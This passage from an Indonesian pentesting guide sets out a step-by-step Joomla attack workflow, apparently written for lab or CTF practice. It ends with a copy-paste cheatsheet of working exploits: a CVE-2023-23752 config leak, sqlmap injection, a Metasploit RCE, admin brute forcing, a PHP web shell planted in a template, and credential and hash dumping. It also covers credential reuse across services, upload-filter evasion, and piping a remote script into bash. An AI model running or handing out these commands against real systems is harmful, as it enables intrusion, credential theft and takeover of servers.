# Step 4: Cek user di sistem
cat /etc/passwd | grep -E "sh$|bash$"
ls -la /home/
```

**OUTPUT BERHASIL ✅ — DB creds dari configuration.php:**

PHP

```
public $user = 'joomla_user';
public $password = 'Sup3rSecretDBpass!';
public $db = 'joomla_db';
```

➡️ Login MySQL lokal dan dump semua hash:

Bash

```
mysql -u joomla_user -p'Sup3rSecretDBpass!' joomla_db \
    -e "SELECT username, password FROM jos_users;"
```

---

### Langkah 6.2 — Privilege Escalation Check

Bash

```
# Cek sudo
sudo -l

# Cek SUID binaries
find / -perm -4000 -type f 2>/dev/null | head -20

# Cek cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Cek capabilities
getcap -r / 2>/dev/null

# Jalankan LinPEAS untuk full check
curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

➡️ Berdasarkan hasil → ke **`<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`**

---

### Langkah 6.3 — Credential Reuse ke Service Lain

Bash

```
# Credentials dari Joomla/DB → test ke semua service
export JOOMLA_USER="admin"
export JOOMLA_PASS="password123"
export DB_USER="joomla_user"
export DB_PASS="Sup3rSecretDBpass!"

# Test SSH dengan semua credentials yang ditemukan
ssh "$JOOMLA_USER@$TARGET"
ssh "$DB_USER@$TARGET"

# Test ke service lain
nxc ssh $TARGET -u "$JOOMLA_USER" -p "$JOOMLA_PASS"
nxc ftp $TARGET -u "$JOOMLA_USER" -p "$JOOMLA_PASS"
nxc smb $TARGET -u "$JOOMLA_USER" -p "$JOOMLA_PASS"   # → ke <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
```

**Cross-Service Credential Testing Chart:**

text

```
Joomla Creds / DB Creds Found
     │
     ├─ ─→ Port 22   (SSH)    → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Port 21   (FTP)    → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
     ├──→ Port 445  (SMB)    → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     ├──→ Port 3306 (MySQL)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     ├──→ Port 5985 (WinRM)  → evil-winrm
     └──→ Port 3389 (RDP)    → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`/administrator/` → 403|IP whitelist|Coba via proxy, cari path alternatif `/admin`, `/backend`|
|JoomScan gagal detect versi|Versi disembunyikan|Manual check via XML files, README.txt|
|CVE-2023-23752 return 403|Sudah dipatch|Cek versi exact, coba CVE lain|
|bcrypt sangat lambat di-crack|Cost factor 10, GPU kurang|Update hash langsung di DB, atau wordlist lebih spesifik|
|Template editor "not writable"|Permission file read-only|Coba upload via Media Manager atau Extension installer|
|Extension upload diblokir|Filter ekstensi ketat|Coba `.phtml`, `.php5`, `.pht`|
|Login form ada CAPTCHA|Proteksi brute force|Gunakan CAPTCHA solver atau fokus ke RCE path lain|
|Hydra gagal semua|CSRF token issue|Gunakan Burp Suite intruder yang handle token otomatis|
|`com_fields` tidak vulnerable|Bukan Joomla 3.7.0 exact|Cek versi exact, coba komponen lain|
|MySQL tidak bisa remote|Hanya localhost|Harus dapat shell dulu, query via shell|
|API endpoint 404|Bukan Joomla 4 atau API disabled|Coba endpoint alternatif, atau gunakan enumeration manual|
|Joomla dalam maintenance mode|Admin aktifkan maintenance|Login via `/administrator/` tidak terpengaruh maintenance mode|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Joomla Terdeteksi di Port 80/443
│
├─ FASE 0: Deteksi Versi
│   ├─ 4.0.0 - 4.2.7  → FASE 1A (API Leak → DB Creds → Hash → Login)
│   ├─ 3.7.0           → FASE 1B (SQLi com_fields → Hash → Login)
│   ├─ < 3.4.6         → FASE 1C (Pre-Auth RCE → Shell langsung)
│   └─ Versi lain      → FASE 2 (Enumeration)
│
├─ FASE 2: Enumeration
│   ├─ CVE Component   → Searchsploit → Exploit
│   └─ No CVE          → User Enum → FASE 4 (Brute Force)
│
├─ FASE 3: Hash Cracking
│   ├─ Berhasil crack  → Login Admin → FASE 5
│   └─ Gagal crack     → Update hash di DB (jika ada MySQL access)
│
├─ FASE 4: Brute Force
│   ├─ Password found  → Login Admin → FASE 5
│   └─ Gagal           → Kembali cari CVE / path lain
│
├─ FASE 5: Admin → Shell
│   ├─ Template Editor → RCE → FASE 6
│   ├─ Media Upload    → RCE → FASE 6
│   └─ Extension ZIP   → RCE → FASE 6
│
└─ FASE 6: Post-Exploitation
    ├─ Read configuration.php → Creds → Reuse ke service lain
    ├─ Dump DB hashes → Crack → Lateral movement
    └─ PrivEsc check → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
mkdir -p ~/joomla_loot/{enum,creds,files,shell}

# === DETECTION ===
curl -s "http://$TARGET" | grep -i 'generator'
curl -s "http://$TARGET/administrator/manifests/files/joomla.xml" | grep -oP '(?<=<version>)[^<]+'
joomscan -u "http://$TARGET"

# === CVE-2023-23752 (Joomla 4.0.0-4.2.7) ===
curl -s "http://$TARGET/api/index.php/v1/config/application" | jq .

# === SQLi CVE-2017-8917 (Joomla 3.7.0) ===
sqlmap -u "http://$TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,database()),0)" --dbs --batch

# === PRE-AUTH RCE CVE-2015-8562 (Joomla < 3.4.6) ===
msfconsole -q -x "use exploit/multi/http/joomla_http_header_rce; set RHOSTS $TARGET; set LHOST $LHOST; set LPORT $LPORT; run"

# === HASH CRACKING ===
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt          # bcrypt Joomla 3+
hashcat -m 3721 hash.txt /usr/share/wordlists/rockyou.txt          # MD5+salt Joomla 1/2
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# === BRUTE FORCE ADMIN ===
hydra -l admin -P passwords.txt $TARGET http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid" -t 10

# === POST-AUTH RCE ===
# Edit template via GUI, tambahkan: <?php system($_GET['cmd']); ?>
curl "http://$TARGET/index.php?cmd=id"
curl "http://$TARGET/templates/protostar/index.php?cmd=id"

# === POST-EXPLOITATION ===
cat /var/www/html/configuration.php
mysql -u DB_USER -p'DB_PASS' DB_NAME -e "SELECT username,password FROM jos_users;"
```

---

> **➡️ NEXT:** Setelah Joomla selesai dan dapat shell atau credentials, lanjut ke **`[💧 File 17c: Drupal Pentesting & Exploitation Workflow](/docs/drupal-cms)`** untuk Drupalgeddon dan vulnerability patterns yang berbeda di Drupal. Atau jika credentials dari Joomla bisa dipakai di service lain, ikuti Cross-Service chart di Fase 6.3.
